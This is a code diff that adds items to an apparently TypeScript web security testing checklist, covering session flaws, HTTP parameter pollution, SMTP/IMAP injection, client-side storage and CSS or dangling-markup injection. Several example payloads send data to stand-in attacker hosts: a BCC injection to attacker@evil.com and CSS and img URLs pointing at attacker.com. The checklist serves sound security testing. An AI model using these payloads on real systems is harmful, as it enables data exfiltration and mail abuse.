@@ -599,6 +599,18 @@ export const webCategories: ChecklistCategory[] = [
         how: "Try setting the password back to a previously used one and confirm it's rejected if a policy claims to prevent reuse.",
         severity: "low",
       },
+      {
+        id: "web-auth-pw-9",
+        text: "Test account enumeration via registration form",
+        how: "Register with an already-used email and compare the response/timing against a fresh email to check if account existence is disclosed.",
+        severity: "low",
+      },
+      {
+        id: "web-auth-pw-10",
+        text: "Test weak security question/answer implementation",
+        how: "If account recovery uses security questions, check whether answers are guessable/researchable (mother's maiden name, favorite color) or brute-forceable without lockout.",
+        severity: "medium",
+      },
     ],
   },
   {
@@ -654,6 +666,18 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for session token leakage via Referer header",
         how: "Check if a session token embedded in the URL (not cookie) leaks to third-party resources via the Referer header.",
         severity: "high",
+      },
+      {
+        id: "web-auth-session-9",
+        text: "Test session puzzling (session variable overloading)",
+        how: "Check if a session attribute set during one flow (e.g. a partial-auth or password-reset step) is later reused/trusted by an unrelated flow, letting you skip steps or confuse authentication state.",
+        severity: "high",
+      },
+      {
+        id: "web-auth-session-10",
+        text: "Test browser cache weakness for authenticated pages",
+        how: "After logging out, use the browser's back button / local cache (not server replay) to check if sensitive pages are still viewable from cache on a shared/public computer.",
+        severity: "low",
       },
     ],
   },
@@ -1461,6 +1485,72 @@ export const webCategories: ChecklistCategory[] = [
       },
     ],
   },
+  {
+    id: "inject-hpp",
+    name: "HTTP Parameter Pollution",
+    emoji: "🧷",
+    items: [
+      {
+        id: "web-inject-hpp-1",
+        text: "Test HPP by duplicating a parameter with conflicting values",
+        how: "Send the same parameter name twice with different values and observe which one the backend uses vs. any WAF/validation layer in front — a mismatch can bypass filtering.",
+        payloads: ["?id=1&id=2"],
+        severity: "medium",
+      },
+      {
+        id: "web-inject-hpp-2",
+        text: "Test HPP to bypass input validation on a specific field",
+        how: "If a single-value check validates only the first/last occurrence, smuggle a malicious second value past it depending on server parsing order.",
+        payloads: ["?amount=10&amount=-1000"],
+        severity: "high",
+      },
+      {
+        id: "web-inject-hpp-3",
+        text: "Test HPP impact on server-side request construction (SSRF/redirect targets)",
+        how: "Check if duplicating a URL-bearing parameter causes the backend to use an unexpected value when building an outbound request or redirect.",
+        severity: "high",
+      },
+      {
+        id: "web-inject-hpp-4",
+        text: "Test HPP across query string vs body for the same parameter name",
+        how: "Send the parameter once in the query string and once in the POST body, and check which source the framework prioritizes — this can bypass checks applied to only one.",
+        severity: "medium",
+      },
+    ],
+  },
+  {
+    id: "inject-mail",
+    name: "IMAP/SMTP Injection",
+    emoji: "📬",
+    items: [
+      {
+        id: "web-inject-mail-1",
+        text: "Test SMTP command injection via email-sending features",
+        how: "Inject newline-separated SMTP commands into a field (To/CC/Subject/body) that gets passed to an SMTP library, to attempt additional command execution or recipient injection.",
+        payloads: ["victim@example.com%0ABCC:attacker@evil.com"],
+        severity: "high",
+      },
+      {
+        id: "web-inject-mail-2",
+        text: "Test IMAP injection in webmail search/filter features",
+        how: "If the app exposes IMAP-backed search/filter functionality, inject IMAP command syntax to manipulate the underlying query.",
+        severity: "high",
+      },
+      {
+        id: "web-inject-mail-3",
+        text: "Test email-sending feature for open relay / spam abuse",
+        how: "Check if a contact-form or invite-a-friend feature can be abused to send arbitrary content to arbitrary recipients, turning the app into a spam relay.",
+        severity: "medium",
+      },
+      {
+        id: "web-inject-mail-4",
+        text: "Test for template injection in outbound email content",
+        how: "Check whether user-controlled input reaching an email template is rendered through the same template engine used elsewhere, opening an SSTI path via email features.",
+        severity: "high",
+        tags: { relatedItemIds: ["web-inject-ssti-1"] },
+      },
+    ],
+  },
 
   // ─────────────────────────── BUSINESS LOGIC / REQUEST-LEVEL ───────────────────────────
   {
@@ -1704,6 +1794,76 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-req-pm-4",
         text: "Test wildcard targetOrigin in outgoing postMessage calls",
         how: "Check if the app sends sensitive data via postMessage with targetOrigin '*', letting any embedding frame read it.",
+        severity: "medium",
+      },
+    ],
+  },
+  {
+    id: "client-storage",
+    name: "Client-Side Storage & Caching",
+    emoji: "🗄️",
+    items: [
+      {
+        id: "web-client-storage-1",
+        text: "Check for sensitive data stored in localStorage/sessionStorage",
+        how: "Inspect browser storage (DevTools → Application) for tokens, PII, or internal identifiers stored in plaintext, accessible to any script on the page (including XSS payloads).",
+        severity: "medium",
+      },
+      {
+        id: "web-client-storage-2",
+        text: "Check for sensitive data left in IndexedDB",
+        how: "Inspect IndexedDB databases created by the app for cached authenticated API responses or credentials.",
+        severity: "medium",
+      },
+      {
+        id: "web-client-storage-3",
+        text: "Test Cache-Control on pages/responses containing sensitive data",
+        how: "Verify sensitive pages and API responses set Cache-Control: no-store so they aren't retained in the browser's disk cache after logout.",
+        severity: "low",
+      },
+      {
+        id: "web-client-storage-4",
+        text: "Check Service Worker cache for sensitive cached responses",
+        how: "Inspect the Cache Storage API entries registered by a service worker for authenticated API responses cached beyond their intended lifetime.",
+        severity: "medium",
+      },
+      {
+        id: "web-client-storage-5",
+        text: "Test data persistence after logout",
+        how: "Log out and check whether localStorage/sessionStorage/IndexedDB entries containing session data are actually cleared, not just the cookie.",
+        severity: "medium",
+      },
+    ],
+  },
+  {
+    id: "client-resource",
+    name: "Client-Side Resource Security",
+    emoji: "🧩",
+    items: [
+      {
+        id: "web-client-res-1",
+        text: "Test for CSS injection via user-controlled style values",
+        how: "Inject CSS into user-controlled style attributes/classes to check for data exfiltration via attribute selectors or UI redressing.",
+        payloads: ["<div style=\"background:url(https://attacker.com/?x=1)\">"],
+        severity: "medium",
+      },
+      {
+        id: "web-client-res-2",
+        text: "Test client-side resource manipulation (DOM-based open redirect / resource loading)",
+        how: "Check if client-side JS builds resource URLs (scripts, iframes, API base URL) from attacker-controllable input like the URL fragment.",
+        severity: "medium",
+      },
+      {
+        id: "web-client-res-3",
+        text: "Check Subresource Integrity (SRI) on third-party scripts",
+        how: "Verify externally-hosted scripts/stylesheets loaded via <script src> include an integrity attribute, so a compromised CDN can't silently serve malicious code.",
+        payloads: ["<script src=\"https://cdn.example.com/lib.js\" integrity=\"sha384-...\" crossorigin=\"anonymous\">"],
+        severity: "medium",
+      },
+      {
+        id: "web-client-res-4",
+        text: "Test for dangling markup injection when full XSS is filtered",
+        how: "If script tags are blocked but raw HTML injection is possible, inject an unclosed tag (e.g. <img src='https://attacker.com/log?) to exfiltrate subsequent page content via the browser's own request.",
         severity: "medium",
       },
     ],
